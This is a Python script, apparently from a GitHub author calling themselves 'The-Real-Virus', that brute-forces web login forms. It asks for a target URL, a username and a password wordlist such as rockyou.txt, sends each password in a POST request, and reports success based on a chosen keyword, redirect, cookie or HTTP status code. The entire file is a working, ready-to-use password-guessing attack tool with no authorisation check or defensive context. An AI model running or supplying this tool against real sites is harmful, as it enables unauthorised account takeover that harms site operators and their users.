import os
import requests
import sys

def show_banner():
    banner = r"""
                       ______
                    .-"      "-.
                   /  *ViRuS*   \
       _          |              |          _
      ( \         |,  .-.  .-.  ,|         / )
       > "=._     | )(_0_/\_0_)( |     _.=" < 
      (_/"=._"=._ |/     /\     \| _.="_.="\_)
             "=._ (_     ^^     _)"_.="
                 "=\__|IIIIII|__/="
                _.="| \IIIIII/ |"=._
      _     _.="_.="\          /"=._"=._     _
     ( \_.="_.="     `--------`     "=._"=._/ )
      > _.="                            "=._ <
     (_/                                    \_)
 ____________________________________________________
 ----------------------------------------------------        
        #  Web Login Brute Force
        #  Author : The-Real-Virus
        #  https://github.com/The-Real-Virus
 ____________________________________________________
 ----------------------------------------------------
"""
    print(banner)

def get_user_input(prompt):
    """Helper function to get user input with validation."""
    value = input(prompt)
    while not value.strip():
        print("[!] Input cannot be empty. Please try again.")
        value = input(prompt)
    return value.strip()

def read_password_file(file_path):
    """Reads passwords from a file, ignoring decoding errors."""
    passwords = []
    try:
        with open(file_path, "r", errors="ignore") as file:
            passwords = [line.strip() for line in file]
    except FileNotFoundError:
        print(f"[!] Error: Password file '{file_path}' not found.")
        sys.exit(1)
    return passwords

def main():
    # Display the banner
    show_banner()

    # Prompt user to proceed
    choice = input("\nPress 'y' to continue or 'n' to exit: ").strip().lower()
    if choice == 'n':
        print("\nExiting the script. Goodbye!")
        return
    elif choice != 'y':
        print("\nInvalid choice. Exiting the script.")
        return

    # Clear screen before continuing
    os.system('clear' if os.name == 'posix' else 'cls')  # 'clear' for Linux/Mac, 'cls' for Windows

    # User inputs
    print("==== Interactive Login Bruteforce Script ====")
    target = get_user_input("Enter the target URL (e.g., http://example.com:8080/login): ")
    username = get_user_input("Enter the username to test: ")
    passwords_file = get_user_input("Enter the path to the password file (e.g., rockyou.txt): ")

    print("\n[?] Detection Methods: ")
    print("1. Search for a specific success keyword in the response (e.g., 'welcome back').")
    print("2. Detect redirection to a specific URL (e.g., '/dashboard').")
    print("3. Check for a specific cookie or authentication token (e.g., 'auth_token').")
    print("4. Match a specific HTTP status code (e.g., 200 or 302).")

    detection_method = input("\nChoose a detection method (1/2/3/4): ").strip()
    if detection_method == "1":
        needle = get_user_input("Enter the success keyword (e.g., 'welcome back'): ")
    elif detection_method == "2":
        redirect_url = get_user_input("Enter the redirect URL (e.g., '/dashboard'): ")
    elif detection_method == "3":
        cookie_name = get_user_input("Enter the cookie name to check (e.g., 'auth_token'): ")
    elif detection_method == "4":
        success_code = get_user_input("Enter the HTTP status code for success (e.g., 200): ")
    else:
        print("[!] Invalid option. Exiting.")
        sys.exit(1)

    # Read passwords from the file
    passwords = read_password_file(passwords_file)

    # Display the task details
    print("\n==== Starting Bruteforce ====")
    print(f"Target: {target}")
    print(f"Username: {username}")
    print(f"Password file: {passwords_file}")
    print(f"Number of passwords to test: {len(passwords)}\n")

    # Start testing passwords
    found = False
    for index, password in enumerate(passwords, start=1):
        sys.stdout.write(f"[{index}/{len(passwords)}] Attempting -> {username}:{password}\r")
        sys.stdout.flush()

        try:
            # Sending the POST request
            response = requests.post(target, data={"username": username, "password": password}, timeout=5)

            # Detection logic based on user choice
            if detection_method == "1" and needle in response.text:
                found = True
            elif detection_method == "2" and redirect_url in response.url:
                found = True
            elif detection_method == "3" and cookie_name in response.cookies:
                found = True
            elif detection_method == "4" and str(response.status_code) == success_code:
                found = True

            # Stop if success is detected
            if found:
                print(f"\n[>>>] Success! Valid password '{password}' found for user '{username}'.")
                break
        except requests.RequestException as e:
            print(f"\n[!] Error: Unable to connect to the target. Details: {e}")
            break

    # Final message
    if not found:
        print(f"\n[!] No valid password found for user '{username}' after testing {len(passwords)} passwords.")

    print("\n==== Bruteforce Complete ====")

if __name__ == "__main__":
    main()
